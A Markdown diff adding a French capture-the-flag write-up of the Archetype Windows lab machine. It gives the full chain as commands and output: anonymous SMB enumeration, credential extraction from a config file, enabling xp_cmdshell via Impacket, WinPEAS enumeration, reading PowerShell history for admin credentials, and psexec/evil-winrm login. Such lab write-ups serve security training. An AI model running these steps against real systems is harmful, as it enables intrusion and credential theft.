@@ -1,0 +1,278 @@
+---
+title: Archetype
+description: WU Archetype
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 3
+  badge:
+    text: 'very easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**VERY EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Archetype est une machine Windows qui illustre des erreurs de configuration courantes en environnement d'entreprise. L'accès initial est obtenu via un partage SMB exposé contenant des identifiants de base de données. Ces identifiants permettent de se connecter à un serveur Microsoft SQL Server où l'exécution de commandes est activée. L'escalade de privilèges est réalisée en découvrant les identifiants administrateur dans l'historique des commandes PowerShell.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+```bash
+nmap -sC -sV -T4 <TARGET_IP>
+```
+
+**Ports ouverts :**
+
+| Port | Service | Version |
+|------|---------|---------|
+| 135 | MSRPC | Microsoft Windows RPC |
+| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn |
+| 445 | SMB | Windows Server 2019 Standard |
+| 1433 | MS-SQL-S | Microsoft SQL Server 2017 |
+| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |
+
+### Enumération SMB
+
+Lister les partages disponibles avec accès anonyme :
+
+```bash
+smbclient -N -L \\\\<TARGET_IP>
+```
+
+**Résultat :**
+
+```shell wrap
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+```
+
+Le partage `backups` est accessible sans authentification.
+
+---
+
+## Accès initial
+
+### Exploration du partage SMB
+
+Connexion au partage `backups` :
+
+```bash
+smbclient //<TARGET_IP>/backups -N
+```
+
+```shell wrap
+smb: \> ls
+  .                                   D        0  Mon Jan 20 13:20:57 2020
+  ..                                  D        0  Mon Jan 20 13:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
+
+smb: \> get prod.dtsConfig
+```
+
+### Découverte d'identifiants
+
+Le fichier `prod.dtsConfig` (configuration SQL Server Integration Services) contient des identifiants de base de données :
+
+```xml
+<DTSConfiguration>
+    <Configuration ConfiguredType="Property"
+                   Path="\Package.Connections[Destination].Properties[ConnectionString]"
+                   ValueType="String">
+        <ConfiguredValue>
+            Data Source=.;
+            Password=**REDACTED**;
+            User ID=ARCHETYPE\sql_svc;
+            Initial Catalog=Catalog;
+            Provider=SQLNCLI10.1;
+        </ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+```
+
+**Identifiants trouvés :**
+- **Utilisateur :** `ARCHETYPE\sql_svc`
+- **Mot de passe :** `**REDACTED**`
+
+---
+
+## Prise de contrôle (Foothold)
+
+### Connexion au serveur MSSQL
+
+Installation d'Impacket (si pas déjà installé) :
+
+```bash
+python3 -m venv impacket-venv
+source impacket-venv/bin/activate
+git clone https://github.com/fortra/impacket.git
+cd impacket
+pip install .
+```
+
+Connexion au serveur SQL avec les identifiants découverts :
+
+```bash
+python examples/mssqlclient.py ARCHETYPE/sql_svc:'<PASSWORD>'@<TARGET_IP> -windows-auth
+```
+
+### Activation de l'exécution de commandes
+
+Vérifier si on a les privilèges sysadmin :
+
+```sql
+SELECT IS_SRVROLEMEMBER('sysadmin');
+-- Retourne : 1 (Vrai)
+```
+
+Activer `xp_cmdshell` pour l'exécution de commandes :
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+Vérifier l'exécution de commandes :
+
+```sql
+EXEC xp_cmdshell 'whoami';
+```
+
+```
+archetype\sql_svc
+```
+
+### Flag user
+
+```sql
+xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
+```
+
+```
+**REDACTED**
+```
+
+---
+
+## Escalade de privilèges
+
+### Enumération avec WinPEAS
+
+Uploader WinPEAS sur la cible :
+
+```bash
+# Télécharger WinPEAS localement
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
+
+# Dans le shell mssqlclient, utiliser la commande upload
+upload winPEASx64.exe C:\Users\Public\winpeas.exe
+```
+
+Exécuter WinPEAS et sauvegarder la sortie :
+
+```sql
+xp_cmdshell C:\Users\Public\winpeas.exe > C:\Users\Public\output.txt
+xp_cmdshell type C:\Users\Public\output.txt
+```
+
+### Découvertes importantes
+
+**1. SeImpersonatePrivilege activé**
+
+```
+SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+```
+
+Ce privilège pourrait être exploité avec des outils comme PrintSpoofer ou JuicyPotato.
+
+**2. Fichier d'historique PowerShell**
+
+```shell wrap
+PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+### Lecture de l'historique PowerShell
+
+```sql
+xp_cmdshell type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+**Sortie :**
+
+```shell wrap
+net.exe use T: \\Archetype\backups /user:administrator **REDACTED**
+```
+
+**Identifiants administrateur trouvés !**
+
+---
+
+## Obtention du root
+
+### Connexion en tant qu'administrateur
+
+Avec `psexec.py` d'Impacket :
+
+```bash
+python examples/psexec.py 'administrator:<PASSWORD>@<TARGET_IP>'
+```
+
+Alternative avec Evil-WinRM (le port 5985 est ouvert) :
+
+```bash
+evil-winrm -i <TARGET_IP> -u administrator -p '<PASSWORD>'
+```
+
+### Flag root
+
+```cmd
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+```
+**REDACTED**
+```
+
+---
+
+## Outils utilisés
+
+| Outil | Utilisation |
+|-------|-------------|
+| nmap | Scan de ports et énumération des services |
+| smbclient | Enumération des partages SMB et téléchargement de fichiers |
+| Impacket (mssqlclient.py) | Connexion MSSQL et exécution de commandes |
+| Impacket (psexec.py) | Exécution de commandes à distance en tant qu'Administrateur |
+| WinPEAS | Enumération pour escalade de privilèges Windows |
+
+---
+
+## Points clés à retenir
+
+1. **Fichiers sensibles dans les partages SMB** - Les fichiers de configuration contiennent souvent des identifiants
+2. **MSSQL xp_cmdshell** - Quand activé, permet l'exécution de commandes sur le système
+3. **Historique PowerShell** - Contient les commandes précédemment exécutées, potentiellement avec des identifiants
+4. **SeImpersonatePrivilege** - Les comptes de service ont souvent ce privilège, permettant des attaques par usurpation de token
+
+---
+
+## Références
+
+- [HackTricks - Pentesting MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html)
+- [Hackviser - Pentesting MSSQL](https://hackviser.com/tactics/pentesting/services/mssql)
+- [HackTricks - Escalade de privilèges Windows](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/)
+- [Impacket GitHub](https://github.com/fortra/impacket)
+- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng)
